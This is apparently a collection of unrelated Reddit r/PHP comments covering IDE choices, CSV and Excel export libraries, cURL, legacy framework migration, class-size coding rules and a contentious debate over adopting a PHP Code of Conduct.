how you work. Ask yourself if this is a good relationship to be in with your code.
Quickly glancing at the docs, this looks extremely similar to Capistrano. Why would you use this over Capistrano? 
i would never use a product from a developper with such an attitude, however good it may be
Yes. When Zend Studio abandoned their product to Eclipse several years ago, it became unusable overnight.
How about placing individual changes in your APP db on a message queue that get processed by a scalable amount of worker processes which syncs each change individually (or in batch?) to your Redis data store? Question is what triggers the message to be generated, that would depend on how your data gets stored to your mysql db. Is the API providing read only access to the data?
prove my point.
Do you know if something like MySQL Workbench exists for pgsql? That's the only thing i'll be missing if i make the switch. 
well.. they are still 'heavy' compared to something like sublime or vim, but those don't generally offer the same level of functionality either. (yes, I'm aware of the plugins and such available). I've got a fairly beefy machine from 2012, and Java IDEs are still noticeable - things pause/hang when I don't want. It's a tradeoff I make, and given the machine's performance, it's acceptable when I'm doing big coding. Small/quick edits, I use vim or something else. 
Sublime Text / NetBeans.
PHPStorm is written in Java too...
Phpstorm, its worth every penny!
More like an over glorified texteditor...
That does sound like disk caches.
Because once the PHP interpreter has been loaded into memory by your OS, and once your OS has loaded the file into memory, subsequent computations can be much quicker by avoiding disk access. If you start up your browser, it might take a little while. If you close it and immediately start it again, it will be quicker this time. Same principle.
Before PHP 7, there were licensing issues with the JSON extension, which meant that many distributions packaged a different implementation to the official one, [jsonc](https://github.com/remicollet/pecl-json-c). So that's probably your issue: the manual documents the official version.
&gt; Unfortunately the testimonials are kind of abstract like this The reason the testimonials are kind of vague is because it isn't any one or two or even five killer features. It's a combination of too many to count, and every person has their own reason why it changed their life. For me? It was Easier Debugging, Symfony Plugin, Easier Test Running, Better Autocompletion and Code Coverage. Easier Unit Test Running and Debugging fall hand in hand for me. Maybe it was a feature built in to Zend Studio that I just never took note of before, but in PHP I define where my PHPUnit xml file is, then any tests I have I can right click the file to run the one test, or even right click the function itself in the editor to run that one assertion. Put some debug points in, have Shift + F9 auto-matically re-run the last test in debug mode and I've got an easily repeatable re-runnable way to reach my break points with ease. You can still activate the debugging through the browser using xDebug like any other IDE, but the combination of ease with PHPUnit and xDebug built in is great. Tying in to that, I can right click the tests directory, a test file, or a method and run the test with code coverage. Which shows me a pane on the right that has a folder view with percentage covered, and if I go to a file it'll show me what lines are and aren't covered by tests I ran by adding little red or green lines along the line numbers in the editor pane. It's just such a great way to see what paths I'm not testing. The Symfony 2 plugin in just amazing when using anything to do with Symyfony2. The annotations are better autocompleted, you can control click services and routes to go straight to them, as the IDE now understands them better, same with the Doctrine Repositories and Entities. The autocompletion as a whole is a step up, as it understands arrays of objects much more intuitively and it can detect the return types of functions better than IDE's I've used in the past. And that's just my five. Other people will have other answers, because there's just *so much* it does so well. Like great JS support, CSS and JS File Watchers, *.md file previews to see how they'll look on github (with the right plugin), the global search being great over all and many others. Hell, there's a feature to see what features you use frequently and what you don't, so you can see what you might be missing out on if you want some ideas for increasing efficiency.
&gt; I'm not sure what you mean by "built in class properties" I was referring to built in classes like PDO and readonly/private properties. I don't think there is anything that could be done from regular PHP to set their value. 
I think I'll chunk the array to 500, convert humans into JSON and send them chunk by chunk. It will just be a workaround though. I'll try to find a better and more stable solution. Perhabs I can create a master node and forwards crons to it. That was, instead of APP push, API may pull data from APP. I'm not sure if that counts as `input` too for PHP. To be honest, I wish PHP could give a fatal error or something and not silently truncate our data because I plan to forward critical errors to my mobile phone. The documentation says it is supposed to raise warnings but it doesn't. There is no warning in our Bugsnag about it. Weird. :) 
&gt; PHP Storm is not the only way It is arguably the best of them all.
Just a warning in case someone thinks it's a good idea: I've used N++ with the xdebug plugin in the past. The plugin is shit, crashes, hangs and misbehaves constantly and overall feels like something put together in a day with no testing. I do not recommend it.
And even a more massive decrease in memory usage can be obtained by just setting `performance_schema` to `0`. From my experience this setting is a must in small VPSs and it may well be the thing OP is missing. 
&gt; But probably one of its most useful features - for me - is its local version control. Even though it easily integrates with just about any version control system you can throw at it, PHPStorm actually doesn't require you to save anything and will instead detect and save changes automatically for you. When it does this, it's actually making mini-commits to its own local version control that you can roll back to at any point. I can't tell you how many times this has saved me in legacy projects I've inherited that had no version control set up. Wait, what the hell is this? 
Try using the SORT_ASC and SORT_DESC constants for sorting order instead of boolean arguments.
For free, Netbeans worked great for me.
When you say "without a framework", do you mean without any libraries at all? Coding without a framework is OK, as long as you are allowed to use some well-tested components to do the security stuff. 
These two are interesting projects guys. Thank you for sharing!
/u/mattstauffer did an interesting thing in this situation where I believe he routed requests to his old CodeIgniter application through a Laravel middleware. Then he could slowly port sections of the app over from CodeIgniter to Laravel without having to re-write the entire application at once. As you port one section of the app, you no longer send that request URI to the CI app from the middleware.
Use e.g. xdebug to profile both requests and see where the difference is coming from.
Ha ha, this made me laugh! `:-)` 
&gt; &gt; No PHP Storm is not the only way. Netbeans, Eclipse and Zend Studio will work just as well &gt; Not on the phpstorm hype train, but those three being java-based and resource heavy is the main reason why I wouldn't recommend them It seemed like /u/hexagonalc was implying that PHPStorm wasn't written in Java.
Pick a project file, then Right-click-&gt;Local History-&gt;Show History. Pretty sure it has a limit as to how far back it will go, but its leeway seems pretty generous. You can check all of your saved changes, and see when you deployed to your server as well. You can also right-click and revert back to any of those changes should you need to. That's also not to say that it can serve as a substitute for a proper version control system, but in a pinch, it does the job pretty well. **EDIT**: [Here's some more reading on Using Local History](https://www.jetbrains.com/phpstorm/help/using-local-history.html), and [a more in-depth piece on what it is, and some of its limitations](https://www.jetbrains.com/phpstorm/help/local-history.html)
Nuke it from orbit - only way to be sure.
terrkerr got a good one. The weak typing that conflates `5` and `"5"` doesn't usually cause issues when I can easily keep the entire codebase in my head, but when working on a 500k-line, 10-yo project with a dozen other developers, it's easy to have it cause bugs that are a bit annoying to track down. Same thing with there being no separate array and dictionary types. The way a reference "infects" a variable can be incredibly irritating. The other thing that comes to mind is the effect of PHP not being object-oriented until later versions, namely in the way that the stdlib handles errors. Most userland code uses exceptions, but most of the stdlib still uses the old notion of errors that need to be explicitly checked for after function calls (but don't bubble up! so you better not have stricter standards than your third-party dependencies). So you end up writing a custom error handler that throws an [ErrorException](https://secure.php.net/manual/en/class.errorexception.php), but then you've got to hope that handler gets registered before any errors occur... it just gets a lot messier than it needs to be.
I think so. There is a library I have been working on which makes things a bit simpler as it allows to transform html tables to excel sheets: https://github.com/Ticketpark/HtmlPhpExcel
If you really need a real excel file, probably. Most of the use cases I've seen (exporting generic data, reporting) are fine as CSV. If needed the user can convert the CSV to an XLS as easy as "Save As".
 class Third { protected $collection = []; public function __constrct(array $items) { array_map(function(A $items){ // Validate all of A is the same type. }, $items); $this-&gt;collection = $items; } } That was faster for me. * First: 0.008126974105835 * Second: 0.037296056747437 * Third: 8.6069107055664E-5 However, I prefer the second way the best, `Second`. Having the `add` method allows you to easily add new items to your collection. It also assures that all items added to the collection have the same logic applied to them upon insertion. Also: $given = []; foreach (range(1, 340) as $iteration) { $given[] = new A; } Keeps your script shorter and more readable.
It was quick script duplicate line and etc... The add stays also on the class just showed two techniques 
Useful, cheers
cURL is great, we're using it in several spots. the `curl_setopt`interface may not look fancy but it gets the job done. I've never started trying to use it, then realized it didn't support what I wanted to do, not something I can say about the various abstractions built on streams. I also like how easy it is to convert PHP &lt;=&gt; command line if I need to share it with anyone else. 
Good tip, I'll try that one myself.
Thanks, will take a look
I will give you my 2 cents, which may be not worth a quarter penny... but whatever haha. I am a pretty newbie PHP developer since I have been using the language just a few months ago when I started working on an established project made with CI, working mainly by osmosis and not quite comfortable with the implementation of the framework but could cope with it. Later I got the chance to work on a small scale project for a web app which goal was to consume some APIs and consolidate the data. I wrote a very bare bones "framework" (uri parsing and redirection, routing through a single file, focusing on mainly using anon funcs [closures]) and then when I came back to do some maintenance on the CI project it didn't look that bad, not because my code stinks so bad everything now looks cool, but in a way I... could relate more to the framework and it's goals. TL;DR: If the framework migration is not critical for the app just take a step back, use the time it would take to do the migration to work on other projects which help you build more skills to translate into the maintenance of the CI app.
Resumable uploads help with connection hiccups, but not with the other considerations (e.g., server memory limits, server execution time limits, accurate upload status bars). There are other ways to address those, like throwing more hardware and software at the problem, but chunked uploads are easy and inexpensive.
[Or directly to google sheets](https://github.com/asimlqt/php-google-spreadsheet-client)
Agreed. cURL is great but Guzzle takes all the hassle out of it and makes it a breeze to use
What's painful about it?
Full rewrite in 1 go is the worst thing you can do. Doing it part by part will allow you to do it better. Check this out of you haven't already: http://www.amazon.com/Working-Effectively-Legacy-Michael-Feathers/dp/0131177052
I try to use the "be liberal in what you accept, conservative in what you do" rule when exporting data. Unless, specifically needing to export to XLS/X, I would export a CSV. It's much easier to produce a CSV and is less bloated.
Together with HttpModifier I am releasing also Thruster Modifiers (Multi-Part/Url-Encoded/Json) Body Parsing and other modifiers used in Thruster HTTP Server and Client http://ln.niekis.lt/http-modifiers (Sorry only PHP7)
&gt; Fansoro is much better both of them if you want to know. Fansoro is Faster, Better, Easy. According to who? You? Yeah, I'll pass. Between your shitty attitude and that shoddy codebase, I'll stick with more tried and true solutions over your hobby CMS.
That would amount for something akin to: http://i.stack.imgur.com/J0QhZ.jpg
PHP even has a built-in function for CSV export!
Middlewares are for Frameworks as their work with Request/Response. This is more for Servers or Clients standalone things... Like on HTTP Server I add Date and X-Powered-By, In client I add User-Agent
PHP apps that are Varnish aware use cURL.
'a bit dated' = a phrase that launched 89375834 javascript projects... last month.
I will use components. Actually at this point I will probably just use a framework. 
What I always wonder a bit with stuff like this, is why would you need a system to make a modification, as opposed to just making the modification. For example, instead of using a "PoweredByModifier" I can just call `$response-&gt;withHeader('X-Powered-By', '..');`. What am I missing? 
It should be root but can't login with anything. Probably the best thing to do is to uninstall and reinstall everything, thanks. I remembered someone telling me about cloud9, so I give it a shot and I managed to print a row from a table onto the screen, this is good news for me! Being a simple cs student and knowing no one with web experience, I found it really hard to get into.
You can do the same with symfony components too, which is probably what laravel use anyway.
If you are using XAMPP: https://www.apachefriends.org/faq_windows.html &gt; How can I set a root password in MySQL? &gt; &gt; Configure it with the "XAMPP Shell" (command prompt). Open the shell from the XAMPP control pane and execute this command: &gt; &gt; mysqladmin.exe -u root password secret &gt; &gt; This sets the root password to 'secret'.
Not to mention that CSVs are far more portable.
So basically you'll need to store the userid in a session, so when the user hits the login button and it's successful it would go something like: Session_start(); $_SESSION["userid"] = "1"; Then when you're getting the blood type you'd go something like SELECT * FROM bloodtype_table WHERE userid = $_SESSION["userid"]; This is very high level and definitely not suitable for prod stuff but it gives you some ideas. It might be easier to go through a framework though? 
How many months does it to take to run?
I would just love to see what you've contributed to the community.
Use a framework, like Laravel, which has user logins out of the box. https://laravel.com/docs/5.2/authentication
Ah ok, thanks for pointing out this tool. 
Isn't it awesome? I've been using it to popular huge xlxs templates lately and it's cut my development time as well as cpu/memory utilization dramatically. Well worth the price. [php_excel](https://github.com/iliaal/php_excel). Documentation could be better but it's very simple to use, really. 
It should load the repo in less than 12 hrs depending on your computer. 
Right. Excel is a good tool, but I just feel bad catering to the one tool. I know, I know, LibreOffice, OpenOffice, Numbers, etc., can open XLS/X, but it just sucks. If it's tabular data, I use a CSV. Some folks want to make pretty tables, multiple pages, etc. If my apps need dashboard functionality, I build it into front-end and make it interactive. I hate relying on a third-party tool as part of my app's experience. Then again, I hate building apps that don't play well with other products. 
quote: But while Isaac is a Joyent employee, Ben is not—and if he had been, he wouldn't be as of this morning: to reject a pull request that eliminates a gendered pronoun on the principle that pronouns should in fact be gendered would constitute a fireable offense for me and for Joyent. ----- Wow...
sure. the correct solution always depends on the context.
I think he mostly got downvoted for failing to join in on the "burn CI" circlejerk...
Why do you open the database connection twice?
"Joel on Software" recommends not rewriting. There are probably a thousand undocumented business rules hidden away in the code that have already been tried, tested and bugfixed. What's the expected life of the code?
Go to the base version control setting page, you'll see an option for maximum number of history rows.
You miss reusability and if you have more than two places of same code you have duplicate
I'm in the same boat as you and appreciate the suggestions in this thread 
&gt;This is very high level What would you suggest as an alternative to session variables? Cookies/tokens in a db?
I read once that office docs are just compressed bundles of xml files. That true for excel too?
I think he rather meant low level
Well, I lol'd...
We use PHPExcel to generate a spreadsheet with something like 1k columns and 50k rows with complex formulas and formatting, it works great. One tip I have is to make the Excel sheet ahead of time with all the formatting and formulas and just use PHPExcel to pump data into it, it's faster and every time $whoever wants to update formulas, they just send you the updated excel sheet and you push it out.
accident, I wrote the script for me, then rewrote it for general use. just delete line 6. I'll edit the script 
Cloud9 instances run on stock Ubuntu as far as I remember - you get a 0.5G RAM VPS attached to it, it's very impressive. Installing everything is just the same as Ubuntu, using `sudo apt-get install`. 
Uninstalled all and reinstalled xampp. It looks like apache and mysql are running just fine. I only tried a php with one echo and it worked. Looks like the problem was the ports as you described. So when I get time I will try the things you suggested. What will I need to connect php to sql? "127.0.0.1","root","" what else? Thank you very much by the way, you were really helpful.
There are myriad different variations on CSV. Apparently PHP's is a less useful one, though.
Thanks!
That means there's already a web server running on your computer somewhere.
I believe that RFC 4180, MS Office, and Libreoffice/OpenOffice all implement the same standard. I don't think it is unfair to call this the CSV standard. As far as I know, the PHP variation for CSV is only "compatible" with itself. Now that I have you attention: Do you have commit rights? Could I perhaps get you to note on https://secure.php.net/manual/en/function.fgetcsv.php and https://secure.php.net/manual/en/function.fputcsv.php that those functions are actually not compatible with RFC 4180, MS Office, and Libreoffice/OpenOffice? That seems like a rather important factiod to prominently mention there.
This looks like the perfect solution. Thanks!
Ha! Staring me right in the face. Thanks, bromosapien.
This is the most frustrating thing about skype.
MySQL has a query cache. It's automatic / default. So, if your script is running mysql-queries, that could explain. If you want to avoid hitting mysql query cache you can write select statements like this: SELECT SQL_NO_CACHE * from `table`; etc... Ps. If you are not doing db-queries, it could be anything from operating system file-system caches/buffers to built in php opcache etc.
Please notice that this caches the precompiled bytecode from the script, not the actual result (output) of the script running, to answer the question.
Side note - PRS-2 : https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-2-coding-style-guide.md
&gt; If someone asks for an Excel file, I usually just give them a CSV. Must be nice to have that kind of flexibility. If my manager asked for Excel and I gave him a CSV, I'd probably have to start looking for a new job... 
The goal of a small class and smaller methods is to provide better readability and maintenance. This avoids code smells and possible other issues. Just code following standards such as PSR's and remember that there will be another developer reading it at some point. Now, in regards to the question, 200 lines per class and 30 lines per method, seems as an overkill. 
I'm unfortunately having to waste my time doing some weird shit to get these classes under 200 lines, i think a recommended limit definately make sense, or even a soft &amp; hard limit, but a hard limit of 200 lines is practically impossible!
They "improved" the standards by adding this, apparently :(
It's terrible - 30 lines for a method can be far too small in many instances
Save time and money: Docker/Vagrant FTW. *Same as production...Check *PHP7 - Gotcha *Xdebug?...No problem. *Blackfire.io...Yep *?? Months later: Updates!... Sorted. 
Just name all your variables A-ZZZ, and use GulpJS on your local machine to regex replace all of your Line breaks to a tab space once your finished :D 
Yeah, its well paid and close to home, but I'm looking elsewhere... These guys are mad
Just did some maths Assuming you lose 25 Characters for basic class entities like name space and private variables Leaves you with 175, Assuming you use Code blocks for use in unit testing /** * @param $min * @param $max * * @return string */ function generateMinMaxLine($min, $max) { $min = $min - 1; return "@media screen and (min-width: " . $min . "px) and (max-width: " . $max . "px) { "; } Your looking at another 13 lines. Allows you to only have 13 Functions... Assuming there all only One line of code... and a return Value... 
You'd do well if you also researched CDNs (Content Delivery Networks). Handling great amount of data (and there is no greater amount of data then video streaming/downloading/uploading) requires great network knowledge.
Might be OOT, but How do you deal with database persistence for development env? Do you share the volume to the vagrant (and then docker)? Or just let it saved on the VMs? I always need to dump from production for the real scenario debug using mongodb, and share does not due to vsbox bug for years.
I'd try out [prepared statements and parametrized queries](http://php.net/manual/en/pdo.prepared-statements.php). In example #3, you can see where it tries to be safe about using a string ("name") provided by the end-user. &gt; $stmt = $dbh-&gt;prepare("SELECT * FROM REGISTRY where name = ?"); if ($stmt-&gt;execute(array($_GET['name']))) { while ($row = $stmt-&gt;fetch()) { print_r($row); } } 99% of the time you should be using those for your SQL. (The other 1% of the time you'll end up gluing SQL strings together in code, but we avoid that because it's prone to bugs and security risks.)
Yea but is it that bad to duplicate a line of code like that? If I'm not duplicating that line but use your system instead, I'll have to duplicate your different syntax. The net effect is about the same no?
You're generating lots of noise, do you really think you're making anything close to a compelling argument? Or are you just cementing the idea in people's mind that you're not that pleasant a person? From elsewhere: "At this stage I might not even read the RFC that closely.....if PMJones is against it, then I'm probably for it." 
_He's_ generating lots of noise? Come on. He's pretty right on: &gt; I think fighting against the code of conduct is a losing battle, because it will get passed. And you have a choice, you can either keep contributing to PHP, or move on and do something else. It’s as simple as that. You do not have a right to contribute to PHP, it’s a privilege. It sucks how that privilege is handed out, and it sucks how sometimes that privilege is wielded as a stick by which to beat other poeople, but at the end of the day, despite it being an open source project, it is a private project, and nobody has to take your contributions. It’s as simple as that. &gt; Second, and more importantly, the very same argument applies in favor of the status quo; that is, **not** having an explicit code of conduct. Also: &gt; From elsewhere: "At this stage I might not even read the RFC that closely.....if PMJones is against it, then I'm probably for it." is exceptionally dangerous thinking.
I tend to follow the default code size rules in PHPMD http://phpmd.org/rules/codesize.html These define the method size limit as 100 lines and the class length as 1000 lines excluding whitespace. The only times I have had issues with the number of lines in a method has been Factory/ServiceProvider/DI classes where I may be configuring 8/10 closures in a single method. I tend to suppress the warning for those types of classes, but haven't seen any other instances where a class or method goes above those limits where it cannot be broken down into smaller components. The limit your boss has imposed seems a bit tight, but it does make you think about what your code is trying to do and how it needs to do it. I have known people who have worked in environments where the maximum number of lines per method was 10, they claimed that is made them write really concise code with little to no margin for error. I'm not sure that limit is practical.
This something that bugs me with online code 'quality' analysis tools. Although sometimes it's correct to review whether classes or methods are getting 'too big' when writing new code, doing it continually is not productive. What happens is that you get into the habit of making your code fit into an arbitrary set of rules, and then feel a lot of psychological pressure from yourself, to maintain that constant level of 'quality', i.e. to not break those rules on each and every commit. The problem with doing that continually is that: * Sometimes you just need to break the rule - for some problems having a 'big' class or method is cleaner and more maintainable than forcibly breaking it apart. If you're in the habit of always trying to avoid having too big classes/methods, then you will spend time and energy trying to avoid the correct solution, because you don't want to break the rules. * Refactoring code continually can have a higher cost compared to refactoring it after every X commits. Although sometimes refactoring code as you go is the right thing to do, other times it's a lot more efficient to leave off refactoring, until you've got more of the solution in place. That allows you to see how the final code should be working and refactor it all in one go. Rather than having hard limits that are always in place for all commits, I would definitely recommend just having a separate 'refactoring reviews' once a week for big features, and before a feature is marked as done for smaller features. &gt; I get no reason for this limit from my employer other than "It's better that way" The problem it solves is that code needs to be reviewed and refactored.......if it isn't people will commit the first thing that works, which leads to classes and functions growing out of control. The hard limit isn't perfect, but it's probably better than having no rules in place. Rather than getting rid of the rule completely, you should ask to change it so that having classes grow beyond a certain limit have to be approved by a senior/team lead. That would still put the onus on people to think about the code, but would also allow exceptions in the rare cases where it's needed. 
If you're speaking about docker then you would have seperate containers for apache/php/mysql/xdebug/blackfire/volumes etc which you would link: https://docs.docker.com/engine/userguide/dockervolumes/ Advantage of this is they are easy to throw away/replace if you need to update/change/swap something. Worth noting Phpstorm has support for Docker containers, which makes life a little easier. 
&gt; exceptionally dangerous thinking I'm pretty sure this was proposed as PHP 4's tagline
the troll game is strong with this guy
&gt; ...that the burden of proof remains on those who support the Contrbutor Covenant, proof which they sorely lack, or are unwilling to put forth. Unfortunately (or not?), these things aren't accepted or not based upon the logical validity of a series of statements they make. You don't need a burden of proof to enact extra rules, however perfectly sensible, or however arbitrary and bonkers they may be (subjectively or objectively); you just need appropriate majority vote. If you currently *need* to convince people to vote for your proposal to gain a majority, then having a cogent, sound and valid argument may be of great use in your advocacy, but if you already have a majority then you don't actually need a cogent, sound and valid argument at all. If you can get a majority simply through convincing speech-making and confidence, you don't need a sound argument either. 
I completely agree that a hard limit is not a good idea but I would personally consider 30 lines per method quite reasonable, I find it incredibly rare that I have a method with more lines than that. 
I actually followed your tips where applicable, but my talks got rejected so I have no idea if I did it wrong. :D
I don't think you are being fair. Yes he does post several article of his here, but each one of them has been respectful and constructive, trying to make arguments and not just being "noise". I'm not saying he is speaking the truth and we must accept it, I'm just saying this is quite appropriate in the current discussion and I respect that.
&gt; Phpexcel will start to eat memory. Yup, this is exactly why we're using box/spout for Excel exports in my workplace. Once you get close to 100K records or so, memory and run time become an issue with the maatwebsite lib (which uses PHPExcel under the hood.)
This. Use real tools like PHPMD &amp; PHP Code Sniffer to detect bad code, not arbitrary hard limits. Small agile classes are great, but some components require complex, battle tested code (like billing).
Ability to contribute is neither right nor privilege. It is earned.
The spirit of the rule is good but understanding WHY you might want small classes and methods is more important in my opinion. Single responsibility and all that jazz... If you split classes too finely you may end up with something cumbersome to work with in terms of cognitive load and file hopping. On the other hand you also protect yourself a bit from future change the more fine grained the classes and methods are.
Just to be clear since you didn't source the quote, that is not a quote from PM Jones, that's from Chris Hartjes in the /dev/hell podcast.
it is if you want to keep your job. Seriously I agree a bit, most OOP developers use classes not as thing that do stuff but stuffs that does things. 
Why is this not in the mainline composer?
`brew unlink php56` `brew link php70`
Best PHP joke.
That isn't the point- the one _they_ want you to accept gives them the tools to destroy you over anything deemed offensive. Twitter, Instagram, personal blog, anywhere. The dissent isn't about simply having one, its about having the 'right' one.
Yep, that's a perfectly easy and acceptable solution. But, I prefer to use different versions simultaneously, because I don't like the concept of a single active PHP version on my machine. I want to be able to code any project against any version without influencing how my other projects are functioning.
I actually played with Vagrant for a few hours before deciding to go the FastCGI route. I had expected it to be easier to set up an environment identical to my production environment, but I ran into errors quite quickly (can't reproduce them now, sorry). It would take me a lot of time to install and configure those virtual machines exactly as my production server, and then I'd still miss out on mirroring my hosting configuration because it's managed through Plesk on my production server. I also didn't want to strangle my (quite old) MacBook running multiple virtual machines simultaneously :). If you depend on non-PHP external packages a lot and/or work in a team, I see more reason to invest in properly setting up multiple Vagrant machines and running them locally. But as an independent developer working in PHP without any external 3rd party dependencies, it saved me a lot of headaches and performance to just install those different versions locally and be done with it. When I find an install of CentOS 7 with Plesk Admin ready to go, or if I could mirror my actual production server into a Vagrant box, perhaps I'll go that route after all. Just thought it'd be worth sharing how to set this up through FastCGI since it took me more effort than anticipated.
Right, but it ought to be earned by demonstrating the quality of the contribution. I don't think anyone is suggesting otherwise, except for the people that think *code* is the only thing that anyone should ever be judged on when contributing to an open source project. As a maintainer of an open source project, it's in your own rational self interest to ensure that *as many people as possible* are *able* to contribute. That doesn't mean you have to *accept* any contribution, but it does mean that you shouldn't be setting yourself up to not even *look* at some contributions by pushing possible contributors away. "But McGlockenshire," you're saying by now, "the very presence of a CoC is pushing *me* away from contributing to this project!" Well, if that's the case, I don't have anything constructive to tell you, because I don't think that anything I'd say would change your mind. I just hope you understand that this is the *exact opposite goal* of most CoC proponents, and it's probably worth the time to work *with* them so that your concerns can be addressed instead of cranking up the rhetoric and railing against them instead. It seems that this latter viewpoint is the only one that people are willing to express here, and it's ... distressing.
You have taken a small example... There is bigger modifiers like multi-part body parser and etc, which I guarantee you do not want to write it by yourself
&gt; gives them the tools to [...] Twitter, Instagram, personal blog, anywhere. So instead of cranking up the rhetoric, why not tone it down and work *with* CoC proponents to resolve your concerns? Why not say something like "There's a history of bad actors abusing CoCs that cover spaces not under the control of the project. I'm worried about the same thing happening here. What changes can we make here that will make this sort of abuse less likely? Can we eliminate this problem entirely?" Using language like "the one *they* want you accept" and "the tools to destroy you" sets up barriers. It demonizes the position of your opponent. It's not *con*structive, it's *de*structive. It won't solve a damn thing. 
Not to mention that (in my opinion) there is definitely a point where culling responsibilities of classes becomes too much of a mental burden on the developers. When you have to follow 15 declarations down you end up forgetting what you needed to change in the first place. I would say there is a nice area in the middle.
FWIW, Ondřej Surý has this PPA which allows coinstallable versions: https://launchpad.net/~ondrej/+archive/ubuntu/php You literally use it the exact same way: apt-get install php7.0-fpm php5-fpm
&gt; I don't have an obligation to rework it, the proposer(s) do. What the hell. If you're not going to participate constructively, why participate at all? &gt; Fortunately cooler heads have prevailed and reject this and will continue to do so until it has no teeth in it. Well, that's your prerogative, not everyone's. (Me? I'm neutral.)
&gt; If you're not going to participate constructively Precisely... a lot of people clamoring to throw down rules aren't even contributing code. So... ?
https://en.wikipedia.org/wiki/Principle_of_charity
&gt; a lot of people clamoring to throw down rules aren't even contributing code Citation needed. Each of the PHP CoCs has came from valuable and prolific contributor to internals, and each actively sought input from not just fellow internals devs, but userland PHP types as well. Do you even know what Derick Rethans has contributed to PHP?
What exactly do you need from MySQL Workbench? It has loads of features and many of them aren't useful to developers the majority of the time. It is great for MySQL admins and database engineers though.
I love PHPExcel and am currently changing some legacy apps from spreadsheet_excel_writer to it. There is also a composer version of it on packagist which is great
curl is the best. I do webcrawling related apps all the time and options like min/max receive speed, header/body-arrival callbacks really help. Without curl I'd probably had to use fsockopen. Of course I use a thin wrapper around it, so there's no need to mess with curl_* functions directly.
Wow, give this man a medal
Wow, that exchange on the Opal project is terrifying. I wonder what the end-point is for the "consequences" that these people are envisioning for those that hold unpopular/bigoted opinions. Just in that microscopic exchange, the pro-CoC crowd said that people who express unpopular opinions should be banned from participating in OSS projects and should be fired from their jobs.
Fuck it I'm going to go create my own scripting language.
Will try this asap. Today I was actually looking for ways to speed up my composer updates
&gt; Wow, that exchange on the Opal project is terrifying. I know! I literally couldn't even conceive that people like that were out there and they were gunning for OSS software. I still want to believe it's just a handful of nuts, but they're noisy nuts that are more than capable of making someone's *real life* miserable. Not just online life -- they want real world ruination for people they don't like. These people absolutely should be given no quarter and no accommodation. They are crazy people. You can't reason with crazy people. What frightens me is how sensible this all sounds on the surface. "A code of conduct! How perfectly civilized. Of course we should document how we would like people to conduct business with each other. What could *possibly* be wrong with that?" As it turns out, a *lot* can be wrong with that, and I was honestly naive and foolish until I read that OpalGate thing. 
&gt; Just in that microscopic exchange, the pro-CoC crowd said that people who express unpopular opinions should be banned from participating in OSS projects and should be fired from their jobs. That thread is pretty hard to wade through, but ~~I didn't see any comments like that~~. Are you misinterpreting something like "if you acted like this at work, you'd get fired"? Regardless, yes, that's pretty much the poster child thread for what can go wrong with a CoC. The upshot is that bad actors, irrational people, trolls, etc, can't be allowed to control the complaint process. This is why I'm in favor of the private mediation proposals that have come up a few times. All sides get to talk to a neutral party dedicated to making sure the problems are worked out. In private, not in public in a way that makes another fucking -gate out of it. You'd be amazed what progress can be made if people just talk calmly about things.
"representing" can be seen as ambiguous. Let's pretend that I'm a prolific contributor to PHP internals and I have a Twitter account that I use both to advertise the cool new things I'm working on for PHP *and also* post my personal thoughts. Let's say that I post something about how Carly Fiorina and Ben Carson are entirely unqualified to be presidential candidates in a way that makes it look like I'm either a mysoginist or a racist, or both. Because I share this communication medium with both my "representing the project/community" messages and my personal messages, it's *possible* for someone to make a complaint against me, under those rules. (This was true as of a late draft of the RFC as pulled by Anthony, I haven't checked to see what Derick has changed yet.) To be clear, I'm pro-CoC. This is a legitimate problem that can and should be addressed, both through more precise wording about what is and is not subject to the CoC, and through more precise wording about the intended target of the messaging.
Wonder if that is exactly the logic behind how we got Hack
Maybe it's because most of the community agrees that a CoC is silly?
There hasn't been shown to be systematic abuse in PHP Internals, or at least abuse that would be solved with a CoC. Sure there are tons of arguments but most are centered around developing PHP *as it should be*. The problem most anti-CoC people see with the current proposal is that is uses the Contributor Covenant as a base. There are tons of arguments against the Contributor Covenant which you can find online. It would be an entirely different situation if it were based around something like Debian's: https://www.debian.org/code_of_conduct
composer solves that without needing me to write a single line of code.
Well, with the PHP license, anybody can create a fork, so it's basically impossible to keep someone from contributing if they really want to.
&gt; People really should read this insanity before you think this is really about some innocent code of conduct. Damn. Well, that got me started down a rabbit hole, and now I'm two hours in and regretting it, and completely opposed to the idea of such a broad CoC. This is how far I've gotten: https://redmine.ruby-lang.org/issues/12004 - And you can recognize the same people from the Opal thread.
I don't know for php but I have tried to contribute to Zend Framework: my next step was to use Symfony without caring about contributing to them.
Do you think a public CoC would prevent the examples you've given?
Oh. Duh. Yeah, glanced *right* over that and it went into the "too stupid to process right now" filter. I just don't understand the state of mind that can lead someone to think a public calling out like that is even remotely OK.
Just in case it's changed in the future, the current reading of that is: &gt; On social networks, the CoC is only considered to apply if the context of the conversation makes it clear that the person represents the PHP project. &gt; &gt; For example, merely having “PHP contributor” in an about or bio is not enough to be “representing the project”. However, a conversation about the PHP project itself (including RFCs, etc) is enough to justify “representation”. Yes, that seems to pretty clearly exclude the situation I outlined. Any complaint made there wouldn't be valid.
&gt;And you have a choice, you can either keep contributing to PHP, or move on and do something else. It’s as simple as that. You do not have a right to contribute to PHP, it’s a privilege.
&gt;And you have a choice, you can either keep contributing to PHP, or move on and do something else. It’s as simple as that. You do not have a right to contribute to PHP, it’s a privilege. How exactly is getting your pull request approved a privilege? Just write good code, dammit. As stated on the linked site's comments: &gt;It also sounds a lot like the phrase: “Well if you don’t like America, you can just get out.”
My only request would be that the committee report included the reason why it should cover it - and also the reason why the event doesn't if not. It'd add more examples and how the CoC peeps are interpreting things.
They have this idea of an ideal world in their head, and they're not concerned with how the means they intend to get there might affect the integrity of the result. In other words, "the ends justify the means". In their mind, any action is justified by the fact that they think they're furthering Social Justice™.
post it on pastebin or the likes. there's absolutely nothing we can tell you given your description. 
I imagine the vast majority have preferred to keep their mouths shut, regardless of their opinion. I frequently witness the problems that a CoC is designed to solve. You can certainly make the argument that the originally-proposed CoC is silly or ineffective, but saying having one at all isn't necessary seems... misinformed.
That's not necessarily the case. For one, reddit is not representative of the PHP community as a whole. For another, people won't necessarily voice their opinion here if it's going against the perceived grain. Also, because we're on reddit, the discussion is at least partly influenced by other subreddits.
Not a fan of the FastRoute implementation, this may be a nice wrapper. I'll have to try it out.
